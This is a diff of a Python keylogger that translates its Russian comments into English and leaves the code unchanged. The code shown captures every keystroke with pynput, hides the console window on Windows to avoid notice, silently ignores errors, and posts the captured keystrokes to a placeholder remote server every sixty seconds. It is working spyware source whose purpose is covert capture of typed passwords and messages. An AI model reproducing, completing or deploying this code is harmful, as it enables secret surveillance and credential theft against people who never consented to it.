@@ -7,7 +7,7 @@ import time
 import requests
 from pynput.keyboard import Listener
 
-# Константы
+# Constants
 SERVER_IP = "your_ip_server"
 SERVER_PORT = 8080
 SEND_REPORT_EVERY = 60  # in seconds
@@ -46,9 +46,9 @@ class KeyLogger:
         try:
             response = requests.post(url, json={"keyboardData": data})
             if response.status_code == 200:
-                pass  # Успешная отправка, ничего не делаем
+                pass  # Successful send, do nothing
         except Exception:
-            pass  # Ошибки игнорируем, продолжаем работу
+            pass  # Ignore errors, continue working
 
     def report(self):
         if self.server_available:
@@ -58,18 +58,18 @@ class KeyLogger:
         timer.start()
 
     def run(self):
-        self.check_server()  # Ожидание запуска сервера
+        self.check_server()  # Wait for server to start
         keyboard_listener = Listener(on_press=self.save_data)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
 
 if __name__ == "__main__":
-    # Скрытие консоли для Windows
+    # Hide console for Windows
     if platform.system() == "Windows":
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-    # Запуск KeyLogger
+    # Start KeyLogger
     keylogger = KeyLogger(SEND_REPORT_EVERY, SERVER_IP, SERVER_PORT)
     keylogger.run()
